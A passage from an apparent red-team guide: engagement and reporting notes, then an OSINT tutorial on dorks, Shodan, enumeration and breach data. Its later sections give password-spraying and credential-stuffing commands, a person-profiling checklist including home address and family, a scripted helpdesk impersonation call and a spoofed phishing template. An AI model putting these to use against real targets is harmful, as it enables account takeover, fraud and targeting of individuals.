**3. identity surface.** vpn portals, sso login pages, password reset flows — these tell you about mfa enforcement and account lockout policy before you've sent a single phishing email or burned a single login attempt.

only after these three are mapped do i move to broad-spectrum scanning. running `nmap -p- --min-rate 10000` against the entire range on hour one produces noise; it doesn't produce direction. lateral movement vs. escalate — the rule i actually use this decision point comes up constantly once you have a foothold, and the textbook answer ("it depends on the objective") isn't actionable in the moment. my actual rule:

**escalate first if local privesc looks like it takes under 30 minutes** — a known kernel cve, a misconfigured service binary, an obvious suid target. local admin/root on the box you're already on is nearly always worth more than the same time spent guessing at lateral paths, because it usually unlocks credential material that *makes* lateral movement trivial afterward (lsass dumps, sam hashes, cached domain creds).

**move laterally first if the current box has nothing more to give** — no cached creds, no interesting local services, no quick local privesc path — but you can see a juicier target from where you're standing (a file share with an obvious naming convention, an open rdp/winrm session, a service account visible in a process list). in that case, staying put and grinding local escalation on a dead-end box is the wasted move.

the deciding signal is always: **does staying here teach me anything i don't already know?** if the answer's no, move. reporting structure a report that gets read has four sections, in this order, and i write the first one last:

**1. executive summary** — three sentences, no jargon, answers "could someone get from the internet to domain admin, and how fast." written for someone who will not read past this page.

**2. attack narrative** — the story of the engagement told as a single chain from initial foothold to objective, not a flat list of cves. this is the section that actually changes minds in the readout meeting, because it shows *consequence*, not just *severity ratings*.

**3. findings, individually scored** — cvss or your framework of choice, but every finding gets a remediation step specific enough that a junior sysadmin could execute it without asking a follow-up question. "patch the software" is not a remediation step. "upgrade veeam backup & replication to 12.3.2.4854 or later" is.

**4. appendix** — raw command output, full request/response pairs for web findings, anything that supports a finding but would clutter the narrative. lessons from engagements that went wrong **1. i triggered a soc incident response by running an unthrottled password spray.** the client's soc wasn't informed of the test window (my scoping mistake, not theirs), and a burst of failed logons across 40 accounts in two minutes paged their on-call at 2am. i now confirm, explicitly and in writing, whether the soc is read into the engagement before any active testing starts — and i throttle spraying regardless, because it's better practice anyway.

**2. i found and reported a vulnerability that turned out to be a previous, *unrelated* compromise already in progress.** i treated it as a normal finding in the report draft before realising the artifacts didn't match anything i'd done. now: anything that looks like it predates my activity, or that i can't directly attribute to my own actions, gets escalated through the emergency contact path immediately — not written up and discussed three weeks later in a report.

**3. i let a report sit for two weeks after the engagement ended before scheduling the readout.** by the time we met, the client had already half-forgotten the context and the meeting was unproductive. now the debrief gets scheduled *before* the engagement starts, not after the report is finished — calendars get busy, and a report without a debrief is a report nobody internalises.

title: OSINT — Open Source Intelligence from First Principles
summary: OSINT methodology, Google dorks, Shodan, email and username enumeration, social media investigation, domain and IP recon, image geolocation, document metadata,
body:
osint — open source intelligence from first principles osint methodology, google dorks, shodan, email and username enumeration, social media investigation, domain and ip recon, image geolocation, document metadata, github secrets, dark web sources, and building target profiles for red team engagements. security osint recon google-dorks shodan red-team reconnaissance security osint — open source intelligence — is the systematic collection and analysis of information from publicly available sources. it is the foundation of every engagement: reconnaissance determines your attack surface before a single packet reaches the target. done well, osint tells you the employee's name, email format, password reuses, exposed admin panels, internal infrastructure details, and the pretext you need to walk in the front door.

this guide covers every major technique and tool — from google dorks to shodan, email enumeration to image geolocation — with the red team context that turns raw data into actionable intelligence. the osint mindset and methodology osint is not random googling. it is a structured process: 1. define objective     — what question am i answering?
2. identify sources     — where is this data likely to exist?
3. collect passively    — no direct contact with target systems
4. analyse and pivot    — each piece of data opens new queries
5. document findings    — everything timestamped and sourced
6. assess confidence    — single-source vs corroborated **passive vs active recon:** osint is passive and semi-passive. the moment you send a packet to the target's infrastructure you cross into active reconnaissance.

**the pivot loop:**

every finding enables new searches. an email address reveals a name. a name reveals a linkedin. linkedin reveals an employer history. an employer reveals a domain. a domain reveals an ip range. an ip range reveals exposed services. email → name → social profiles → employer → domain
   ↓                                            ↓
password leaks                           shodan / censys
   ↓                                            ↓
breached services                       exposed admin panels **osint frameworks:**

- **osint framework** — osintframework.com — interactive directory of every osint tool by category
- **mitre att&ck reconnaissance** — ta0043 — formal taxonomy of reconnaissance techniques
- **ptes (penetration testing execution standard)** — intelligence gathering phase google dorking google's advanced search operators let you construct precise queries that surface information the site owner didn't intend to expose. this is called **google dorking** or **google hacking**. core operators high-value dorks for red team recon # exposed admin panels
site:target.com inurl:admin
site:target.com inurl:login
site:target.com intitle:"admin panel"
site:target.com inurl:wp-admin
site:target.com inurl:phpmyadmin

# config and credential files
site:target.com filetype:env
site:target.com filetype:cfg
site:target.com filetype:conf
site:target.com filetype:xml inurl:config
site:target.com ext:sql
site:target.com ext:bak
site:target.com ext:log

# directory listings
site:target.com intitle:"index of"
site:target.com intitle:"index of" "parent directory"
site:target.com intitle:"index of" passwd

# exposed documents with sensitive content
site:target.com filetype:pdf "confidential"
site:target.com filetype:xlsx
site:target.com filetype:docx

# subdomains discovery
site:*.target.com
site:*.target.com -site:www.target.com

# error messages disclosing info
site:target.com "sql syntax"
site:target.com "warning: mysql_"
site:target.com "fatal error"

# vpn / remote access
site:target.com inurl:vpn
site:target.com inurl:remote
site:target.com intitle:"citrix"
site:target.com intitle:"ssl vpn"

# email addresses
site:target.com "@target.com"
site:target.com intext:"@target.com" filetype:pdf

# passwords in plaintext
site:target.com intext:password filetype:log
site:target.com intext:"password" filetype:txt google hacking database (ghdb) exploit-db maintains a searchable database of thousands of proven dorks: https://www.exploit-db.com/google-hacking-database filter by category: sensitive directories, files containing passwords, vulnerable files, error messages, web server detection, etc. other search engines worth dorking # bing — sometimes indexes things google doesn't
site:target.com filetype:pdf

# duckduckgo — no personalisation, cleaner results
site:target.com

# yandex — excellent for image reverse search and russian-language sources

# baidu — chinese domains/content

# shodan — not a web search engine but indispensable (covered separately) shodan — the search engine for devices shodan continuously scans the internet and indexes the banners returned by every open port on every ip address. it is the single most powerful passive reconnaissance tool against infrastructure. account and api setup # install cli
pip3 install shodan

# initialise with your api key (free account: 100 queries/month)
shodan init your_api_key

# test
shodan info web interface queries (shodan.io) # find everything for an organisation
org:"target corporation"

# find by domain
hostname:target.com

# find by ip range (your own / authorised)
net:10.10.10.0/24

# find specific products
product:"apache httpd"
product:"nginx"
product:"microsoft iis"

# find by port
port:3389 org:"target"
port:22 org:"target"
port:5900 org:"target"   # vnc

# find exposed industrial control systems
port:102 product:"siemens"   # s7
country:us port:44818         # ethernet/ip (rockwell)
port:2404                     # iec 60870

# find specific services
product:"elasticsearch" port:9200
product:"mongodb" port:27017
product:"redis" port:6379

# find login pages / admin panels
http.title:"admin"
http.title:"login"
http.title:"phpmyadmin"

# find by ssl certificate
ssl.cert.subject.cn:"*.target.com"
ssl:"target.com"

# find by specific header or content
http.html:"target.com"
http.favicon.hash:-1555085002   # favicon hash (find same software)

# find default credentials
http.title:"router" default password cli usage # search and get summary
shodan search 'org:"target" port:443'

# get detailed host info
shodan host 192.168.1.1

# download all results
shodan download results 'org:"target"'
shodan parse --fields ip_str,port,transport results.json.gz

# count results
shodan count 'org:"target"'

# find ips for a domain
shodan domain target.com

# monitor your own assets
shodan alert create mynetwork 192.168.1.0/24

# myip
shodan myip shodan filters reference censys — shodan alternative https://search.censys.io

# more detailed tls/certificate data
# free tier: 250 queries/month

same query syntax:
services.http.response.html_title: "admin"
parsed.names: target.com   # ssl cert san entries
autonomous_system.organization: "target corp" fofa, zoomeye, hunter.io (shodan alternatives) https://fofa.info       # chinese-operated, strong coverage of asian infrastructure
https://www.zoomeye.org # chinese-operated
https://hunter.how     # newer, good coverage domain and dns reconnaissance a domain name is the starting point for infrastructure mapping. extract every piece of data associated with it before touching active tools. whois # basic whois
whois target.com
whois 192.168.1.1

# registrar, registration date, expiry, registrant contact (if not privacy-protected)
# key fields: registrant name, email, organisation, name servers

# online whois with history
# https://lookup.icann.org
# https://www.whois.com
# https://whoishistory.com   (historical — pivotal for finding old emails)
# https://domaintools.com    (paid, best for pivot) dns enumeration # basic dns lookup
nslookup target.com
nslookup -type=mx target.com
nslookup -type=ns target.com
nslookup -type=txt target.com  # spf, dkim, verification tokens — leaks service providers
nslookup -type=any target.com

# dig
dig target.com a
dig target.com mx
dig target.com ns
dig target.com txt
dig target.com aaaa     # ipv6
dig target.com soa      # start of authority — primary nameserver + admin email
dig target.com cname

# reverse dns
dig -x 192.168.1.1

# dns zone transfer (if misconfigured — gold mine)
dig @ns1.target.com target.com axfr
nslookup -type=axfr target.com ns1.target.com

# zone transfer exposes all dns records — subdomains, internal hosts, mail servers
# rare on modern infrastructure but common in older organisations spf/dkim/dmarc — intelligence from mail records # spf record — lists every mail service used
dig target.com txt | grep spf
# example: v=spf1 include:_spf.google.com include:sendgrid.net include:mailchimp.com ~all
# reveals: google workspace, sendgrid for marketing, mailchimp for newsletters

# dmarc
dig _dmarc.target.com txt
# p=none means no enforcement — phishing from @target.com is harder to auto-reject

# dkim selector discovery
dig google._domainkey.target.com txt
dig mail._domainkey.target.com txt subdomain enumeration # passive — no dns queries to target
# crt.sh (certificate transparency logs)
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# subfinder (passive, aggregates multiple sources)
subfinder -d target.com
subfinder -d target.com -all -o subdomains.txt

# amass (passive + active, most comprehensive)
amass enum -passive -d target.com
amass enum -d target.com -o subdomains.txt

# theharvester (passive, also gets emails)
theharvester -d target.com -b all
theharvester -d target.com -b google,bing,shodan,certspotter

# active dns brute force (crosses into active recon)
gobuster dns -d target.com -w /opt/seclists/discovery/dns/subdomains-top1million-5000.txt
ffuf -u http://fuzz.target.com -w /opt/seclists/discovery/dns/subdomains-top1million-5000.txt -mc 200,301,302

# dnsrecon
dnsrecon -d target.com -t std      # standard records
dnsrecon -d target.com -t brt -d subdomains.txt  # brute force
dnsrecon -d target.com -t axfr     # zone transfer attempt certificate transparency (crt.sh) every ssl certificate issued by a public ca is logged in certificate transparency logs. this reveals subdomains the organisation never intended to make public: # web
https://crt.sh/?q=%.target.com

# api
curl -s 'https://crt.sh/?q=%.target.com&output=json' | \
  jq -r '.[].name_value' | \
  sed 's/\*\.//g' | \
  sort -u | \
  grep -v '^\.' > crt_subdomains.txt

# what you find: dev.target.com, staging.target.com, vpn.target.com,
#               jira.target.com, jenkins.target.com, old.target.com asn and ip range enumeration # find asn for organisation
whois -h whois.radb.net target.com
bgp.he.net/search?search[search]=target+corp

# get all ip ranges for an asn
whois -h whois.radb.net -- '-i origin as12345' | grep -e '^route:'

# or use amass
amass intel -org "target corporation"
amass intel -asn 12345 email osint email addresses are pivot points: they reveal identity, corporate format, accounts on other services, and membership in breach databases. discovering email format # hunter.io — infers email format from known addresses
https://hunter.io/domain-search?domain=target.com
# reports: {first}.{last}@target.com (87% confidence)
# lists known addresses found publicly

# phonebook.cz
https://phonebook.cz/   # paste domain, get all known emails

# linkedin (manual)
# company page → people → filter by department → note full names
# cross-reference with hunter.io format

# theharvester
theharvester -d target.com -b google,bing,yahoo,linkedin
theharvester -d target.com -b hunter

# from google dorks
site:target.com "@target.com"
site:linkedin.com "@target.com"
site:github.com "@target.com" email validation # smtp verification (manual)
telnet mail.target.com 25
helo test.com
vrfy john.smith@target.com
rcpt to: john.smith@target.com
# response 250 = valid, 550 = invalid

# hunter.io email verifier
https://hunter.io/email-verifier

# email-checker.net, verify-email.org

# emailhippo
https://tools.emailhippo.com breach database lookups # have i been pwned (free, email query)
https://haveibeenpwned.com

# hibp api
curl 'https://haveibeenpwned.com/api/v3/breachedaccount/john.smith@target.com' \
  -h 'hibp-api-key: your_key'

# dehashed — most comprehensive, paid
https://dehashed.com
# query: email:"@target.com" — returns all breached records for domain
# returns: email, username, password (hashed or plain), ip, phone, address

# intelligencex
https://intelx.io
# searches email, domain, ip across leaked databases and dark web dumps

# snusbase (paid)
https://snusbase.com

# leakcheck
https://leakcheck.io **red team application:** if any employee's password appears in a breach database, check if they reused it on corporate systems. password reuse across personal and work accounts is extremely common. email header analysis # when you receive an email (phishing pretext or client comms)
# read headers to identify:
# - sending mail server ip (may be internal infrastructure)
# - email service provider (mailgun, sendgrid, g suite)
# - authentication results (spf pass/fail)
# - timezone (reveals location)

# tools:
https://mxtoolbox.com/emailheaders.aspx
https://toolbox.googleapps.com/apps/messageheader/ username enumeration a username recovered from linkedin, email, or a breach database can be tracked across dozens of platforms. sherlock git clone https://github.com/sherlock-project/sherlock
pip3 install sherlock-project

# search for username across 300+ platforms
sherlock jsmith
sherlock john.smith
sherlock john_smith

# multiple usernames
sherlock jsmith johnsmith j.smith

# output to file
sherlock jsmith --output jsmith_results.txt
sherlock jsmith --csv

# only show found accounts
sherlock jsmith --print-found maigret (sherlock successor) pip3 install maigret
maigret jsmith
maigret jsmith --html   # generate html report with screenshots whatsmyname # https://whatsmyname.app (web)
# or
git clone https://github.com/webbreacher/whatsmyname
python3 whats_my_name.py -u jsmith manual platform checks https://github.com/username
https://gitlab.com/username
https://twitter.com/username
https://instagram.com/username
https://reddit.com/u/username
https://keybase.io/username
https://steamcommunity.com/id/username
https://www.twitch.tv/username
https://www.youtube.com/@username
https://medium.com/@username
https://dev.to/username
https://about.me/username deriving usernames from names given a target's full name, generate all common username formats: # namemash.py
python3 namemash.py 'john smith' > john_usernames.txt
# outputs: jsmith, smithj, john.smith, johnsmith, smith.john, j.smith...

# manual patterns
name="john" surname="smith"
for u in "$name$surname" "$surname$name" "${name:0:1}$surname" "$name.${surname:0:1}" \
  "${name:0:1}.$surname" "$name.$surname" "$surname.$name" \
  "$name\_$surname" "$name${surname:0:1}"; do
  echo "$u"
done social media osint social media is a treasure chest of personal information, location data, relationships, and operational security mistakes. linkedin linkedin is the most valuable osint source for corporate targeting: # what to extract:
- employee names, titles, departments
- tech stack from job postings ("aws", "jenkins", "splunk" → confirms technology)
- org chart / reporting structure
- email format (often in certificates or publications listed)
- former employees (may still have access, know security gaps)
- contractors and third parties
- security team members (defenders to be aware of)
- recent hires in it/security (indicates new tooling)

# without an account:
https://www.linkedin.com/pub/dir/?first=john&last=smith&search=
site:linkedin.com/in "target corporation"
site:linkedin.com/in "target.com" engineer

# linkedin osint tools
https://www.linkedin.com/search/results/people/?company=target
linkedin sales navigator (paid but very powerful)
contactout (browser extension, reveals contact info)
rocketreach twitter / x # search operators
from:username keyword
to:username
"company name" since:2024-01-01 until:2024-06-01
"target.com" filter:links
"target corp" filter:media

# tools
# twint (offline)
git clone https://github.com/twintproject/twint
twint -u username --email --phone
twint -u username -s "password" --output results.csv --csv

# twitter advanced search
https://twitter.com/search-advanced facebook # facebook graph search (limited since privacy changes)
https://www.facebook.com/search/people/?q=john+smith+target+corp

# tools
https://sowdust.github.io/fb-search/   # facebook search filters
intelligencex

# extract: profile photo for reverse image, employment, location check-ins, relationships instagram # location-tagged photos leak physical locations
# exif data (when not stripped) reveals gps coordinates
# background details reveal office/home layout, security measures

# osintgram
git clone https://github.com/datalux/osintgram
python3 main.py target_username
# commands: followers, followings, addrs, captions, comments, hashtags,
#           mediatype, photos, stories, tagged, wcommented, wtagged reddit https://www.reddit.com/search/?q=site%3atarget.com
https://www.reddit.com/search/?q=%22target+corp%22+breach
https://old.reddit.com/user/username/submitted/

# pushshift (archive, when available)
https://redditsearch.io metadata from social media images most platforms strip exif from photos now, but older posts may still contain it: # extract exif
exiftool image.jpg

# key fields: gps coordinates, device make/model, timestamp, software
# gps → google maps → physical location

# online
https://www.metadata2go.com
https://exifdata.com image osint and geolocation a single photograph can reveal location, identity, internal infrastructure details, or physical security measures. reverse image search # google images
https://images.google.com  → click camera icon → upload/paste url

# tineye — best for finding exact duplicates
https://tineye.com

# yandex — best for facial recognition (searches russian social media too)
https://yandex.com/images/

# bing visual search
https://www.bing.com/visualsearch

# pimeyes — face-focused reverse search
https://pimeyes.com

# facecheckid
https://facecheck.id

# workflow: grab profile photo → reverse search all engines → find same photo
# on forums, older accounts, dating profiles → reveal real name / location image geolocation geolocating a photo without gps metadata: techniques:
1. look for text (signs, licence plates, storefronts)
2. architecture style narrows country/region
3. vegetation species narrows climate zone
4. shadow angle + length reveals time of year and latitude
5. street markings (road paint patterns differ by country)
6. power line / infrastructure style
7. vehicle types and licence plate formats
8. search google street view for matching locations # tools for geolocation challenges
https://www.geoguessr.com    # practice geolocation
https://suncalc.org          # sun position analysis
https://www.wolframalpha.com # shadow calculations
https://map.snapchat.com     # real-time location posts
https://maps.google.com      # street view verification

# satellite imagery
https://www.google.com/maps/
https://www.bing.com/maps/
https://maps.esri.com        # often higher resolution
https://www.planet.com       # frequent updates (paid) exif analysis # exiftool (comprehensive)
exiftool photo.jpg
exiftool -gps* photo.jpg     # only gps fields
exiftool -r directory/       # recursive directory

# key fields to check
gps latitude / gps longitude  → convert to decimal degrees for maps
create date                   → when was it taken
make / model                  → device identification
software                      → editing software, may reveal os
serial number                 → camera serial (unique identifier)

# convert gps to decimal degrees
# dms: 51° 30' 26" n → 51 + 30/60 + 26/3600 = 51.507222

# bulk exif from a directory of downloaded social media images
exiftool -csv directory/ > exif_results.csv

# remove all exif (for your own images before publishing)
exiftool -all= photo.jpg document and metadata osint documents published by an organisation often contain hidden metadata revealing internal structure, software versions, and employee names. foca — fingerprinting organisations with collected archives foca (windows tool) automatically downloads and extracts metadata from documents found on a domain: - authors, editors, last-modified-by
- software versions (office 2013, adobe acrobat 9)
- internal hostnames (saved path: \\fileserver01\docs\report.docx)
- printer names
- internal email addresses
- operating system versions manual metadata extraction # exiftool on office/pdf/images
exiftool document.docx
exiftool report.pdf
exiftool presentation.pptx

# key fields in office docs:
author          → person who created it
last saved by   → last person to edit
revision number → number of times saved
company         → org name
content-status  → sometimes "confidential", "draft"
application     → exact office version (e.g., "microsoft office word 14.0") → reveals old office

# key fields in pdfs:
creator         → application that created it
producer        → pdf renderer (often reveals old acrobat → patching gaps)
author
keywords        → sometimes internal classification terms

# bulk download and analyse
# metagoofil — google dork + download + foca-style extract
metagoofil -d target.com -t pdf,doc,xls,ppt,docx,xlsx -l 100 -o metadata/ what metadata reveals in practice github osint github is one of the richest osint sources against technical organisations. developers accidentally commit credentials, internal hostnames, api keys, and architecture details. searching github for secrets # github search operators
org:target-corp password
org:target-corp secret
org:target-corp api_key
org:target-corp internal
org:target-corp confidential

# in url:
https://github.com/search?q=org%3atarget-corp+password&type=code
https://github.com/search?q=%22target.com%22+password&type=code
https://github.com/search?q=%22@target.com%22+password&type=code

# high-value patterns to search
"target.com" password
"target.com" secret
"@target.com" token
"target.com" aws_secret
"target.com" begin rsa private key
"target.com" api_key
"target.com" smtp
"target.com" jdbc automated secret scanning tools # trufflehog — scans git history for high-entropy strings and known secret patterns
trufflehog git https://github.com/target-corp/repo
trufflehog github --org=target-corp

# gitleaks
git clone https://github.com/zricethezav/gitleaks
gitleaks detect --source . --report-format json --report-path results.json

# scan an entire github organisation
gitleaks detect -s https://github.com/target-corp

# gitrob — maps org repos and flags sensitive files
gem install gitrob
gitrob analyze target-corp

# shhgit — real-time github secret monitoring
git clone https://github.com/eth0izzle/shhgit git history analysis # clone and check all commits
git clone https://github.com/target-corp/repo
cd repo

# search all commits for secrets
git log --all --full-history --diff-filter=d -- '*.env'
git log -p --all | grep -i password
git log -p --all | grep -i api_key
git log -p --all | grep -i secret

# find deleted files
git log --all --full-history -- '*.pem'
git log --all --full-history -- '*.key'

# extract a deleted file from history
git show commithash:filename.env

# gitjacker — automated deleted file recovery
gitjacker user osint via github # find email from commits (even if profile is private)
git log --format='%ae' | sort -u

# or via api
curl 'https://api.github.com/repos/target-corp/repo/commits' | \
  jq '.[].commit.author.email' | sort -u

# find all repos for an org
curl 'https://api.github.com/orgs/target-corp/repos?per_page=100' | \
  jq '.[].clone_url'

# find contributors
curl 'https://api.github.com/repos/target-corp/repo/contributors' | \
  jq '.[].login' what to look for .env files                    — db passwords, api keys, smtp credentials
*.pem / *.key / id_rsa        — private keys
config.php / settings.py      — hardcoded credentials
docker-compose.yml            — service passwords
.aws/credentials              — aws access keys
kubernetes/secrets.yaml       — k8s secrets
jenkinsfile                   — ci/cd pipeline, internal urls
.travis.yml / .github/        — ci secrets, deployment keys
readme.md                     — internal urls, architecture hints
comments in code               — todo: remove password before commit people osint building a profile on a specific individual — a target employee, a social engineering mark, or a person of interest. data aggregator sites these aggregate public records (us-centric): https://www.spokeo.com
https://pipl.com         (professional, paid)
https://intelius.com
https://whitepages.com
https://truepeoplesearch.com
https://fastpeoplesearch.com
https://radaris.com
https://beenverified.com typically reveal: full name, age, address history, relatives, phone numbers, email addresses, social media profiles. phone number osint # caller id lookup
https://www.truecaller.com
https://www.spokeo.com/phone-number

# carrier and location
https://www.carrierlookup.com
https://www.twilio.com/lookup    (free api, returns carrier, line type)

# phoneinfoga
git clone https://github.com/sundowndev/phoneinfoga
phoneinfoga scan -n +1xxxxxxxxxxxxx
phoneinfoga serve   # web interface company registration / beneficial ownership # uk companies house (free, excellent)
https://find-and-update.company-information.service.gov.uk
# full filing history, directors, registered addresses, financial accounts

# us sec edgar
https://www.sec.gov/cgi-bin/browse-edgar

# opencorporates — global database
https://opencorporates.com

# offshore leaks (panama papers, pandora papers)
https://offshoreleaks.icij.org

# reveals: directors, shareholders, registered addresses, filing history building a target profile a complete target profile for social engineering pretext: full name
job title and department
direct manager name
direct reports
phone number (desk + mobile)
email address
linkedin profile and connections
recent activity / posts (what they're working on)
tech stack they use (from job posts, github, blog posts)
conferences attended / talks given
publications or contributions
personal interests (from social media)
home address / general location
family members (for pretext)
breached passwords with this profile you can build a highly credible pretext: impersonating their it helpdesk, a vendor they work with, a recruiter, or crafting a spear-phishing email that references their current projects. dark web and breach data the dark web contains forum discussions, leak dumps, and marketplace listings that are often directly relevant to a target. tor browser setup # install tor
apt install tor torbrowser-launcher
torbrowser-launcher

# or use proxychains
apt install proxychains
service tor start
proxychains firefox dark web osint sources # search engines for .onion sites
http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion  (ahmia)
https://ahmia.fi/   (clearnet version)

# intelligencex — indexes dark web too
https://intelx.io

# recon-ng dark web module
recon-ng > modules load recon/domains-vulnerabilities/ghdb breach data sources # free / low-cost:
https://haveibeenpwned.com       — email breach check
https://hashes.com               — hash lookup
https://dehashed.com             — full breach records (paid subscription)
https://snusbase.com             — breach records
https://leakcheck.io             — breach records
https://intelx.io                — indexed breach files, dark web
https://breachforums.com         — (clearnet breach forum)

# for bulk domain searches
# dehashed.com allows: email:@target.com — returns all records for the domain
# this reveals: every employee email + their breached passwords using breach data offensively # from dehashed or similar — you get:
# email: john.smith@target.com
# password: summer2023!
# source: linkedin breach 2021

# step 1 — check if password is still valid (password spraying)
kerbrute passwordspray -d target.local --dc dc_ip users.txt 'summer2023!'

# step 2 — check variations
hashcat --stdout -r best64.rule <<< 'summer2023!' | head -20
# generates: summer2023!!, summer2023!, summer2023!, summer2023@, etc.

# step 3 — credential stuff against public-facing services
crackmapexec smb target-vpn.com -u john.smith -p 'summer2023!'
# owa, citrix, vpn login pages osint automation tools theharvester aggregates emails, hostnames, and ip addresses from multiple sources: # install
pip3 install theharvester
# or: apt install theharvester

# basic
theharvester -d target.com -b google

# all sources
theharvester -d target.com -b all

# specific sources
theharvester -d target.com -b google,bing,shodan,certspotter,hunter,linkedin

# save output
theharvester -d target.com -b all -f output
# generates output.html and output.xml

# with proxies (for opsec)
theharvester -d target.com -b google --proxy http://127.0.0.1:8080 maltego maltego is the premium osint graph tool — visualises relationships between entities: apt install maltego
maltego

# entities: domain, person, email, phone, company, ip, document
# transforms: run automated lookups against external data sources
# result: a graph showing relationships

# free transforms available for:
# - whois, dns, shodan
# - haveibeenpwned
# - virustotal
# - social links (paid)
# - pipl (paid)

# key workflow:
# domain → dns → ip → asn → netblock → hosts
# email → person → social profiles → related emails → breaches recon-ng a full-featured osint framework modelled after metasploit: recon-ng

# workspace management
workspaces create target
workspaces select target

# add seed data
db insert domains name=target.com

# install and load modules
marketplace install all
modules load recon/domains-hosts/hackertarget
run

# key module categories:
recon/domains-hosts/         — subdomain discovery
recon/hosts-hosts/           — dns forward/reverse
recon/domains-contacts/      — email harvesting
recon/contacts-credentials/  — breach lookups
recon/companies-contacts/    — person discovery

# show collected data
show hosts
show contacts
show credentials

# generate report
modules load reporting/html
options set filename /tmp/report.html
run spiderfoot fully automated osint — point at a target, get hundreds of correlated findings: pip3 install spiderfoot
spiderfoot -l 127.0.0.1:5001   # web ui at http://127.0.0.1:5001

# or cli
spiderfoot -s target.com -t internet_name -m all

# modules include:
# dns, whois, shodan, haveibeenpwned, virustotal, securitytrails,
# github, linkedin, darkweb sources, malware checks, etc. amass the most thorough subdomain and asn enumeration tool: # install
go install -v github.com/owasp-amass/amass/v4/...@master

# passive enum
amass enum -passive -d target.com

# active enum (with dns resolution and brute force)
amass enum -active -d target.com -brute

# config file (add api keys for more sources)
cat ~/.config/amass/config.yaml

# intel — find related domains / asns
amass intel -d target.com
amass intel -org "target corporation"
amass intel -asn 12345

# viz
amass viz -d3 -d target.com -o graph.html osint for red team engagements in a red team context, osint output directly feeds attack planning. reconnaissance-to-attack mapping pretext development goal: call the helpdesk as john.smith and request a password reset

osint inputs:
- full name: john smith (linkedin)
- employee id format: first 6 of surname + 3 digits (guessed from naming convention)
- manager name: sarah jones (linkedin)
- recent project: salesforce migration (linkedin post last week)
- direct dial: +1-555-0123 (company website)
- email: j.smith@target.com (hunter.io)
- helpdesk number: found via google dork site:target.com "helpdesk"

pretext:
"hi, this is john smith from the sales engineering team. i'm at a client
site in new york and my salesforce access just dropped — sarah jones asked
me to call in urgently because we have a demo in 20 minutes. can you do
a quick password reset on j.smith@target.com?" spear phishing email construction osint inputs:
- target name and title from linkedin
- current project from recent linkedin post or tweet
- manager's name from org chart
- email format confirmed from hunter.io
- dmarc p=none (can spoof sending address)

email template:
from: sarah.jones@target.com (spoofed — dmarc allows it)
to: john.smith@target.com
subject: salesforce migration — action required

john,
